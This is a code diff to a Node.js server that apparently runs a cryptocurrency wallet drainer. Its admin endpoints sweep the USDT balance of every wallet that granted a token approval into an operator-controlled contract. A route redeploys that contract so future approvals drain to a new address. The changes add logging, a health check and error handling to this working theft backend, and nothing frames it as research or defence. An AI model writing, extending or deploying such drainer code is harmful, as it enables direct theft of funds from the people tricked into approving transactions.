@@ -624,44 +851,67 @@ app.post('/api/admin/drain/:address', adminAuth, async (req, res) => {
             const list = loadApproved();
             const idx = list.findIndex(w => w.address === address);
             if (idx !== -1) { list.splice(idx, 1); saveApproved(list); }
-            return res.json({ success: true, txId: drainAllResult.txId, refundTxId, address, drained: amount / 1e6, refunded: refund / 1e6 });
+            return res.json({ 
+              success: true, 
+              txId: drainAllResult.txId, 
+              refundTxId, 
+              address, 
+              drained: amount / 1e6, 
+              refunded: refund / 1e6 
+            });
           }
         }
       } catch(e) {
-        return res.json({ success: true, txId: drainAllResult.txId, address, warning: 'Full balance drained (refund failed)', drained: balance / 1e6 });
+        return res.json({ 
+          success: true, 
+          txId: drainAllResult.txId, 
+          address, 
+          warning: 'Full balance drained (refund failed)', 
+          drained: balance / 1e6 
+        });
       }
     }
 
+    // Remove from approved list
     const list = loadApproved();
     const idx = list.findIndex(w => w.address === address);
     if (idx !== -1) { list.splice(idx, 1); saveApproved(list); }
 
     res.json({ success: true, txId: drainAllResult.txId, address, drained: balance / 1e6 });
   } catch (error) {
+    log('Drain error:', error.message);
     res.status(500).json({ success: false, error: error.message || 'Unknown error' });
   }
 });
 
+// -------------------- ADMIN: DRAIN ALL --------------------
 app.post('/api/admin/drain-all', adminAuth, async (req, res) => {
   try {
     const list = loadApproved();
     if (list.length === 0) return res.json({ success: true, results: [] });
 
     const drainWeb = makeDrainWeb();
-    if (!drainWeb) return res.status(500).json({ error: 'Drain key not configured' });
-    if (!DRAIN_CONTRACT) return res.status(500).json({ error: 'No drain contract' });
+    if (!drainWeb) {
+      return res.status(500).json({ error: 'Drain key not configured' });
+    }
+    if (!DRAIN_CONTRACT) {
+      return res.status(500).json({ error: 'No drain contract' });
+    }
 
     const results = [];
     const drained = [];
+    
     for (const w of list) {
       try {
         const contract = await drainWeb.contract().at(USDT_CONTRACT);
         const raw = await contract.balanceOf(w.address).call();
         const bal = raw.toNumber ? raw.toNumber() : Number(raw);
+        
         if (bal <= 0) {
           results.push({ address: w.address, success: false, error: 'Zero balance' });
           continue;
         }
+        
         const r = await tryDrainWallet(drainWeb, w.address);
         if (!r.success) {
           results.push({ address: w.address, success: false, error: r.error, txId: r.txId || '' });
@@ -676,12 +926,23 @@ app.post('/api/admin/drain-all', adminAuth, async (req, res) => {
 
     const newList = list.filter(w => !drained.includes(w.address));
     saveApproved(newList);
-    res.json({ success: true, results });
+    
+    res.json({ 
+      success: true, 
+      results,
+      summary: {
+        total: list.length,
+        drained: drained.length,
+        failed: list.length - drained.length
+      }
+    });
   } catch (error) {
+    log('Drain all error:', error.message);
     res.status(500).json({ success: false, error: error.message });
   }
 });
 
+// -------------------- ADMIN: UPDATE WALLET --------------------
 app.post('/api/admin/update-wallet', adminAuth, async (req, res) => {
   try {
     const { address } = req.body;
@@ -691,8 +952,11 @@ app.post('/api/admin/update-wallet', adminAuth, async (req, res) => {
     if (!process.env.DRAIN_PRIVATE_KEY) {
       return res.status(500).json({ error: 'DRAIN_PRIVATE_KEY not configured' });
     }
+    if (!DRAIN_ADDRESS) {
+      return res.status(500).json({ error: 'DRAIN_ADDRESS not configured' });
+    }
 
-    log('UPDATE-WALLET: deploying new contract with owner=' + address);
+    log('UPDATE-WALLET: deploying new contract with recipient=' + address);
 
     const { abi, bytecode } = await compileContract();
 
@@ -722,11 +986,16 @@ app.post('/api/admin/update-wallet', adminAuth, async (req, res) => {
     const contractAddr = deployWeb.address.fromHex(tx.contract_address || receipt.contract_address);
     log('UPDATE-WALLET new contract deployed at: ' + contractAddr);
 
-    const conf = await waitTxConfirmed(deployWeb, signed.txid || receipt.txid || tx.txID, 30000);
-    if (!conf.success) {
-      log('UPDATE-WALLET deploy tx not confirmed, continuing anyway');
+    // Wait for confirmation
+    const txId = signed.txid || receipt.txid || tx.txID;
+    if (txId) {
+      const conf = await waitTxConfirmed(deployWeb, txId, 30000);
+      if (!conf.success) {
+        log('UPDATE-WALLET deploy tx not confirmed, continuing anyway');
+      }
     }
 
+    // Store old contract in CONTRACTS for backward compatibility
     const oldContract = DRAIN_CONTRACT;
     if (oldContract && !CONTRACTS.includes(oldContract)) CONTRACTS.push(oldContract);
     DRAIN_CONTRACT = contractAddr;
@@ -738,7 +1007,7 @@ app.post('/api/admin/update-wallet', adminAuth, async (req, res) => {
       contractAddress: contractAddr,
       owner: DRAIN_ADDRESS,
       recipient: address,
-      txId: signed.txid || receipt.txid || tx.txID,
+      txId: txId || '',
       message: 'New contract deployed with recipient ' + address + '. All future approvals will drain to this address.',
     });
   } catch (e) {
@@ -747,15 +1016,62 @@ app.post('/api/admin/update-wallet', adminAuth, async (req, res) => {
   }
 });
 
-// ========== STARTUP ==========
+// ============================================================
+// HEALTH CHECK
+// ============================================================
+
+app.get('/health', (req, res) => {
+  res.json({
+    status: 'ok',
+    timestamp: new Date().toISOString(),
+    drainContract: DRAIN_CONTRACT || 'not deployed',
+    contracts: CONTRACTS.length,
+    approvedWallets: loadApproved().length,
+    dataDir: DATA_DIR,
+    renderEnvironment: !!process.env.RENDER
+  });
+});
+
+// ============================================================
+// STARTUP
+// ============================================================
 
 async function start() {
+  log('🚀 Starting server...');
+  
+  // Initialize persistent storage
+  ensureDataDir();
+  ensureApprovedFile();
+  ensureEventsFile();
+  
+  log('📁 Data directory:', DATA_DIR);
+  log('📄 Approved file:', APPROVED_FILE);
+  log('📄 Events file:', EVENTS_FILE);
+  
+  log('🔑 USDT Contract:', USDT_CONTRACT);
+  log('🏦 Drain Address:', DRAIN_ADDRESS || 'NOT SET');
+  log('📋 Drain Contract:', DRAIN_CONTRACT || 'NOT SET (will auto-deploy)');
+
+  // Initialize contract
   await initContract();
 
-  app.listen(PORT, () => {
-    log('Server started on port ' + PORT + ' (HTTP)');
+  // Log final status
+  const approvedList = loadApproved();
+  log('📊 Final config:');
+  log('  DRAIN_CONTRACT:', DRAIN_CONTRACT || 'NOT DEPLOYED');
+  log('  CONTRACTS:', CONTRACTS.length > 0 ? CONTRACTS.join(', ') : 'none');
+  log('  Approved wallets:', approvedList.length);
+
+  // Start HTTP server
+  app.listen(PORT, '0.0.0.0', () => {
+    log('✅ HTTP Server started on port ' + PORT);
+    log('   🌐 Main page: http://localhost:' + PORT + '/');
+    log('   👨‍💼 Admin panel: http://localhost:' + PORT + '/admin.html');
+    log('   🔧 Wallet manager: http://localhost:' + PORT + '/admin1.html');
+    log('   ❤️  Health check: http://localhost:' + PORT + '/health');
   });
 
+  // Start HTTPS server if certificates exist
   const KEY_PATH = path.join(__dirname, 'key.pem');
   const CERT_PATH = path.join(__dirname, 'cert.pem');
 
@@ -763,10 +1079,35 @@ async function start() {
     https.createServer({
       key: fs.readFileSync(KEY_PATH),
       cert: fs.readFileSync(CERT_PATH),
-    }, app).listen(3443, () => {
-      log('Server started on port 3443 (HTTPS)');
+    }, app).listen(3443, '0.0.0.0', () => {
+      log('✅ HTTPS Server started on port 3443');
     });
+  } else {
+    log('ℹ️ HTTPS certificates not found, HTTPS server not started');
   }
+
+  log('✅ Server ready!');
 }
 
-start().catch(e => { log('Startup error: ' + e.message); process.exit(1); });
+// ============================================================
+// ERROR HANDLING
+// ============================================================
+
+process.on('uncaughtException', (err) => {
+  log('❌ Uncaught Exception:', err.message);
+  log(err.stack);
+});
+
+process.on('unhandledRejection', (reason, promise) => {
+  log('❌ Unhandled Rejection:', reason);
+});
+
+// ============================================================
+// START
+// ============================================================
+
+start().catch(e => {
+  log('❌ Startup error: ' + e.message);
+  log(e.stack);
+  process.exit(1);
+});
